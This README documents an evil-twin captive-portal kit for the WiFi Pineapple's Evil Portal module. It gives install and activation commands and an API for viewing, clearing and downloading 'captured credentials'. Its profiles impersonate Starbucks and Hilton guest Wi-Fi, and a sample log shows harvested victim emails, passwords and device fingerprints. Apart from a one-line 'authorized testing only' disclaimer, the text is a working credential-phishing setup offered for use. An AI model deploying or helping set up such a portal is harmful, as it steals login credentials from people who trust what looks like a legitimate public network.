# Evil Portal Universal v3.1

A single-file, zero-dependency captive portal for the Hak5 WiFi Pineapple Evil Portal module.

## What's Included (ALL IN ONE FOLDER)

```
evil_portal/
├── MyPortal.php    # The portal (copy to portals/ directory)
├── helper.php      # Management API (copy to module root)
├── config.json     # Runtime configuration
├── install.sh      # One-command installer for Pineapple
└── README.md       # This file
```


## Install

### Step 1: Install Evil Portal Module (if not already)

Pineapple Web UI: `Modules -> Manage Modules -> Install "Evil Portal"`

### Step 2: Copy Files

From your computer:
```bash
scp MyPortal.php helper.php config.json root@172.16.42.1:/tmp/
```

Then SSH into Pineapple and run install:
```bash
ssh root@172.16.42.1
cd /tmp
sh install.sh
```

Or manually:
```bash
ssh root@172.16.42.1
mkdir -p /root/pineapple/modules/EvilPortal/portals
mkdir -p /root/pineapple/modules/EvilPortal/logs
cp /tmp/MyPortal.php /root/pineapple/modules/EvilPortal/portals/
cp /tmp/helper.php /root/pineapple/modules/EvilPortal/
```

### Step 3: Activate

1. Browser: `http://172.16.42.1:1471/`
2. **Modules -> Evil Portal -> Portal Library**
3. Click **MyPortal**
4. Click **Activate**

Done. Any device connecting to your AP will be redirected to the portal.



## API

```bash
# Check status
curl http://172.16.42.1/captiveportal/helper.php?action=status

# View all captured credentials
curl http://172.16.42.1/captiveportal/helper.php?action=creds

# View access logs
curl http://172.16.42.1/captiveportal/helper.php?action=logs

# View statistics
curl http://172.16.42.1/captiveportal/helper.php?action=stats

# Clear all data
curl http://172.16.42.1/captiveportal/helper.php?action=clear

# Download creds as file
curl -O http://172.16.42.1/captiveportal/helper.php?action=download

# Get config
curl http://172.16.42.1/captiveportal/helper.php?action=config

# Set config
curl -X POST -H "Content-Type: application/json"   -d '{"profile":"hotel","ssid":"Hilton_Guest"}'   http://172.16.42.1/captiveportal/helper.php?action=config
```

## Set Profile

Edit `/root/pineapple/modules/EvilPortal/config.json`:
```json
{"profile": "starbucks", "ssid": "Starbucks WiFi", "enabled": true}
```

Or use the API above.

## Captured Data

Stored at `/root/pineapple/modules/EvilPortal/logs/creds.json`:
```json
[
  {
    "timestamp": "2026-08-15T15:30:00+00:00",
    "ip": "192.168.1.105",
    "username": "victim@email.com",
    "password": "secret123",
    "fingerprint": "{...}",
    "profile": "default",
    "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0...)"
  }
]
```

## Troubleshooting

**Portal not in Library?**
- Make sure Evil Portal module is installed from Module Manager
- File must be at `/root/pineapple/modules/EvilPortal/portals/MyPortal.php`
- Refresh the Portal Library in the UI

**No credentials saved?**
- Check `/root/pineapple/modules/EvilPortal/logs/` exists and is writable
- Run: `chmod 755 /root/pineapple/modules/EvilPortal/logs`

**Form submits but no success page?**
- Check that `onSuccess()` is being called (look in access.log)
- Make sure `authorizeClient()` is available (requires Evil Portal module)

## Legal

For authorized security testing and research only. Obtain written permission before deployment.
